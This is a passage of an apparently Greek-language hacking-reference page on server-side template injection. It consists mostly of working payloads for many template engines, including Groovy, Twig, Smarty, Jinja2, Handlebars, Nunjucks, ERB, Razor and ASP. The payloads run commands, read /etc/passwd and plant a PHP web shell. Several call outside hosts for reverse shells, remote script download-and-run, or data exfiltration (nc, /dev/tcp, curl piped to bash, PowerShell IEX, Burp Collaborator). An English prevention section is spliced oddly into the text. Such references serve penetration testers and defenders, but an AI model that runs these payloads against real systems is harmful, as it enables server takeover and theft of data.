})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) είναι το πιο σχετικό συνέδριο κυβερνοασφάλειας στην **Ισπανία** και ένα από τα πιο σημαντικά στην **Ευρώπη**. Με **αποστολή να προωθήσει την τεχνική γνώση**, αυτό το συνέδριο είναι ένας ζωντανός συναντήσεων χώρος για επαγγελματίες τεχνολογίας και κυβερνοασφάλειας σε κάθε ειδικότητα.

{% embed url="https://www.rootedcon.com/" %}

##


### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**Περισσότερες πληροφορίες**

* Στην ενότητα Smarty του [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = Σφάλμα`
* `{{foobar}} Τίποτα`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}

#Hide warnings and errors for automatic exploitation
{{["error_reporting", "0"]|sort("ini_set")}}
```
**Twig - Μορφή προτύπου**

Twig είναι ένας δημοφιλής μηχανισμός προτύπων για τη γλώσσα προγραμματισμού PHP. Χρησιμοποιείται ευρέως για τη δημιουργία προτύπων στο πλαίσιο εφαρμογών PHP, όπως το Symfony και το Laravel.

Το Twig χρησιμοποιεί μια απλή σύνταξη με αναγνωριστικά και ετικέτες για να ορίσει τον κώδικα προτύπου. Ο κώδικας προτύπου μπορεί να περιέχει μεταβλητές, λογικές εκφράσεις, επαναλήψεις και συνθήκες. Επίσης, παρέχει προηγμένες δυνατότητες όπως κληρονομικότητα προτύπων και επαναχρησιμοποίηση τμημάτων κώδικα.

Η ευελιξία του Twig το καθιστά ιδανικό για την εκτέλεση επιθέσεων SSTI (Server-Side Template Injection). Οι επιθέσεις SSTI εκμεταλλεύονται την αδυναμία του συστήματος να απομονώσει τον κώδικα προτύπου από τον κώδικα εφαρμογής, επιτρέποντας στον επιτιθέμενο να εκτελέσει κώδικα PHP στον διακομιστή.

Για να προστατευθείτε από επιθέσεις SSTI, είναι σημαντικό να ελέγχετε προσεκτικά την είσοδο που δέχεστε και να αποφεύγετε την απευθείας εκτέλεση κώδικα προτύπου από την εφαρμογή. Επίσης, μπορείτε να χρησιμοποιήσετε τις ενσωματωμένες λειτουργίες ασφαλείας του Twig για να περιορίσετε τις δυνατότητες εκτέλεσης κώδικα.
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**Περισσότερες πληροφορίες**

* Στην ενότητα Twig και Twig (Sandboxed) του [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

### Plates (PHP)

Το Plates είναι ένας μηχανισμός προτύπων που είναι ενσωματωμένος στην PHP και εμπνέεται από το Twig. Ωστόσο, αντίθετα από το Twig, που εισάγει μια νέα σύνταξη, το Plates χρησιμοποιεί τον φυσικό κώδικα PHP στα πρότυπα, καθιστώντας το ευανάγνωστο για τους προγραμματιστές PHP.

Ελεγκτής:
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
Πρότυπο σελίδας:
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
Διάταξη προτύπου:
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
**Περισσότερες πληροφορίες**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates)

### PHPlib και HTML\_Template\_PHPLIB (PHP)

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB) είναι το ίδιο με το PHPlib αλλά μεταφέρθηκε στο Pear.

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
# Server-Side Template Injection (SSTI)

## Description

Server-Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject malicious code into a server-side template, which is then executed by the server. This can lead to remote code execution (RCE) and other serious security issues.

## Exploitation

To exploit SSTI, an attacker needs to identify a vulnerable server-side template and inject their own code into it. This can be done by manipulating user input that is directly used in the template, such as template variables or template tags.

Once the malicious code is injected, it will be executed by the server, allowing the attacker to perform various actions depending on the server's capabilities. This can include reading sensitive data, modifying server-side files, or even gaining full control over the server.

## Prevention

To prevent SSTI vulnerabilities, it is important to follow secure coding practices:

- **Input validation and sanitization**: Always validate and sanitize user input before using it in server-side templates. This can help prevent code injection attacks.
- **Template sandboxing**: Use template engines that provide sandboxing capabilities. This can restrict the execution of potentially malicious code.
- **Least privilege principle**: Ensure that the server running the templates has the minimum necessary privileges. This can limit the impact of an SSTI vulnerability.

## Conclusion

Server-Side Template Injection is a dangerous vulnerability that can lead to remote code execution and other serious security issues. By following secure coding practices and regularly testing for vulnerabilities, developers can help protect their applications from SSTI attacks.
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
**Περισσότερες πληροφορίες**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib)

### Jade (NodeJS)
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**Περισσότερες πληροφορίες**

* Στην ενότητα Jade του [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> Το [patTemplate](https://github.com/wernerwa/pat-template) είναι ένας μη-μεταγλωττισμένος μηχανισμός προτύπων PHP, που χρησιμοποιεί ετικέτες XML για να διαιρεί ένα έγγραφο σε διάφορα μέρη.
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
**Περισσότερες πληροφορίες**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate)

### Handlebars (NodeJS)

Διαδρομή Διάβασης (περισσότερες πληροφορίες [εδώ](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)).
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= Σφάλμα
* ${7\*7} = ${7\*7}
* Τίποτα
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
**Περισσότερες πληροφορίες**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **Πρότυπο** | **Περιγραφή**                         |
| ------------ | --------------------------------------- |
|              | Αξιολόγηση και απεικόνιση αποτελέσματος |
|              | Αξιολόγηση και απεικόνιση κωδικοποιημένου HTML αποτελέσματος |
|              | Σχόλιο                                 |
| και          | Επιτρέπει κώδικα (απενεργοποιημένο από προεπιλογή)        |

* \= 49

**Πλευρά πελάτη**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**Εξυπηρετητής Πλευράς**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**Περισσότερες πληροφορίες**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**Παράδειγμα απόδοσης στην πλευρά του διακομιστή**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**Περισσότερες πληροφορίες**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = Καμία έξοδος
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = Σφάλμα
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**Περισσότερες πληροφορίες**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (Ruby)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = Σφάλμα`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**Περισσότερες πληροφορίες**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**Περισσότερες πληροφορίες**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

Ελέγξτε την παρακάτω σελίδα για να μάθετε κόλπα σχετικά με την **αυθαίρετη εκτέλεση εντολών παρακάμπτοντας τα αμμοδοχεία** στην python:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = Σφάλμα`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}



{{os.system('whoami')}}
{{os.system('whoami')}}
```
**Περισσότερες πληροφορίες**
* [https://ajinabraham.com/blog/server-side-template-injection-in-tornado](https://ajinabraham.com/blog/server-side-template-injection-in-tornado)

### Jinja2 (Python)

[Επίσημη ιστοσελίδα](http://jinja.pocoo.org)

> Το Jinja2 είναι ένα πλήρως λειτουργικό μηχανή προτύπων για τη γλώσσα προγραμματισμού Python. Υποστηρίζει πλήρως την Unicode, έχει προαιρετικό ενσωματωμένο περιβάλλον εκτέλεσης με ασφάλεια και χρησιμοποιείται ευρέως με άδεια BSD.

* `{{7*7}} = Σφάλμα`
* `${7*7} = ${7*7}`
* `{{foobar}} Τίποτα`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}



{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - Μορφή Προτύπου**

Jinja2 είναι ένας δημοφιλής κινητήρας προτύπων για τη γλώσσα προγραμματισμού Python. Χρησιμοποιείται ευρέως για τη δημιουργία δυναμικών προτύπων σε ιστοσελίδες και εφαρμογές. Η μορφή των προτύπων Jinja2 περιλαμβάνει τα εξής:

- Μεταβλητές: Οι μεταβλητές είναι τμήματα κώδικα που αναπαριστούν δεδομένα που μπορούν να αλλάξουν. Μπορούν να εμφανιστούν στο πρότυπο με τη χρήση διπλών αγκύλων `{{}}`.

- Ελέγχους ροής: Οι ελέγχοι ροής χρησιμοποιούνται για την εκτέλεση συγκεκριμένων ενεργειών με βάση συνθήκες. Μπορούν να χρησιμοποιηθούν με τη χρήση κλειδιών όπως `if`, `for`, `while` κ.λπ.

- Συναρτήσεις: Οι συναρτήσεις είναι τμήματα κώδικα που εκτελούν συγκεκριμένες ενέργειες. Μπορούν να χρησιμοποιηθούν για την επεξεργασία δεδομένων ή την εκτέλεση προηγμένων λειτουργιών.

- Καταστάσεις: Οι καταστάσεις χρησιμοποιούνται για την αλλαγή της ροής του προτύπου με βάση συνθήκες. Μπορούν να χρησιμοποιηθούν με τη χρήση κλειδιών όπως `if`, `elif`, `else` κ.λπ.

- Καταστάσεις ελέγχου: Οι καταστάσεις ελέγχου χρησιμοποιούνται για την εκτέλεση ενεργειών με βάση την αποτίμηση μιας συνθήκης. Μπορούν να χρησιμοποιηθούν με τη χρήση κλειδιών όπως `if`, `else`, `endif` κ.λπ.

Οι προτύποι Jinja2 είναι ισχυρά εργαλεία που μπορούν να χρησιμοποιηθούν για τη δημιουργία δυναμικών ιστοσελίδων και εφαρμογών. Με την κατάλληλη χρήση, μπορούν να παρέχουν ευελιξία και λειτουργικότητα στην ανάπτυξη λογισμικού.
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**RCE μη εξαρτώμενο από**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) `__builtins__`:
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**Περισσότερες λεπτομέρειες σχετικά με το πώς να καταχραστείτε το Jinja**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

Άλλα φορτία στο [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
**Περισσότερες πληροφορίες**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako)

### Razor (.Net)

* `@(2+2) <= Επιτυχία`
* `@() <= Επιτυχία`
* `@("{{code}}") <= Επιτυχία`
* `@ <= Επιτυχία`
* `@{} <= ΣΦΑΛΜΑ!`
* `@{ <= ΣΦΑΛΜΑ!`
* `@(1+2)`
* `@( //C#Code )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwMAXABQAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");`

Η μέθοδος `.NET System.Diagnostics.Process.Start` μπορεί να χρησιμοποιηθεί για να ξεκινήσει οποιαδήποτε διεργασία στον διακομιστή και έτσι να δημιουργήσει ένα webshell. Μπορείτε να βρείτε ένα παράδειγμα ευπαθούς webapp στο [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)

**Περισσότερες πληροφορίες**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = Τίποτα
* `<%= response.write(date()) %>` = \<Date>
```xml
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**Περισσότερες Πληροφορίες**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

Ακόμα κι αν είναι perl, χρησιμοποιεί ετικέτες όπως η ERB στη Ruby.

* `<%= 7*7 %> = 49`
* `<%= foobar %> = Σφάλμα`
```
<%= perl code %>
<% perl code %>
```
### SSTI στο GO

Στη μηχανή προτύπων του Go, η επιβεβαίωση της χρήσης της μπορεί να γίνει με συγκεκριμένα φορτία:

* `{{ . }}`: Αποκαλύπτει τη δομή των δεδομένων εισόδου. Για παράδειγμα, αν περάσει ένα αντικείμενο με ένα χαρακτηριστικό `Password`, το `{{ .Password }}` μπορεί να το αποκαλύψει.
* `{{printf "%s" "ssti" }}`: Αναμένεται να εμφανίσει το αλφαριθμητικό "ssti".
* `{{html "ssti"}}`, `{{js "ssti"}}`: Αυτά τα φορτία θα πρέπει να επιστρέψουν "ssti" χωρίς να προσθέτουν "html" ή "js". Περαιτέρω οδηγίες μπορούν να εξερευνηθούν στην τεκμηρίωση του Go [εδώ](https://golang.org/pkg/text/template).

**Εκμετάλλευση XSS**

Με το πακέτο `text/template`, η εκμετάλλευση του XSS μπορεί να είναι απλή με την άμεση εισαγωγή του φορτίου. Αντίθετα, το πακέτο `html/template` κωδικοποιεί την απόκριση για να αποτρέψει αυτό (π.χ. `{{"<script>alert(1)</script>"}}` έχει ως αποτέλεσμα `&lt;script&gt;alert(1)&lt;/script&gt;`). Ωστόσο, ο ορισμός και η κλήση προτύπων στο Go μπορούν να παρακάμψουν αυτήν την κωδικοποίηση:
{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}

vbnet
Copy code

**Εκμετάλλευση RCE**

Η εκμετάλλευση RCE διαφέρει σημαντικά μεταξύ `html/template` και `text/template`. Το πακέτο `text/template` επιτρέπει την κλήση οποιασδήποτε δημόσιας συνάρτησης απευθείας (χρησιμοποιώντας την τιμή "call"), πράγμα που δεν επιτρέπεται στο `html/template`. Η τεκμηρίωση για αυτά τα πακέτα είναι διαθέσιμη [εδώ για το html/template](https://golang.org/pkg/html/template/) και [εδώ για το text/template](https://golang.org/pkg/text/template/).

Για την εκμετάλλευση RCE μέσω SSTI στο Go, μπορούν να κληθούν μεθόδοι αντικειμένων. Για παράδειγμα, αν το παρεχόμενο αντικείμενο έχει μια μέθοδο `System` που εκτελεί εντολές, μπορεί να εκμεταλλευτεί ως `{{ .System "ls" }}`. Συνήθως είναι απαραίτητη η πρόσβαση στον πηγαίο κώδικα για να εκμεταλλευτεί αυτό, όπως στον δεδομένο παράδειγμα:
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**Περισσότερες πληροφορίες**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### Περισσότερες Εκμεταλλεύσεις

Ελέγξτε το υπόλοιπο [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) για περισσότερες εκμεταλλεύσεις. Επίσης, μπορείτε να βρείτε ενδιαφέρουσες πληροφορίες ετικετών στο [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## Σχετική Βοήθεια

Εάν πιστεύετε ότι μπορεί να είναι χρήσιμο, διαβάστε:

* [Κόλπα Flask](../../network-services-pentesting/pentesting-web/flask.md)
* [Μαγικές συναρτήσεις Python](broken-reference/)

## Εργαλεία

* [https://github.com/Hackmanit/TInjA](https://github.com/Hackmanit/TInjA)
* [https://github.com/vladko312/sstimap](https://github.com/vladko312/sstimap)
* [https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)
* [https://github.com/Hackmanit/template-injection-table](https://github.com/Hackmanit/template-injection-table)

## Λίστα Ανίχνευσης Βίαιης Δύναμης

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## Πρακτική & Αναφορές

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [https://portswigger.net/web-security/server-side-template-injection](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​[**RootedCON**](https://www.rootedcon.com/) είναι το πιο σχετικό συνέδριο κυβερνοασφάλειας στην **Ισπανία** και ένα από τα πιο σημαντικά στην **Ευρώπη**. Με **αποστολή την προώθηση της τεχνικής γνώσης**, αυτό το συνέδριο είναι ένας ζωντανός σημείο συνάντησης για επαγγελματίες τεχνολογίας και κυβερνοασφάλειας σε κάθε ειδικότητα.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

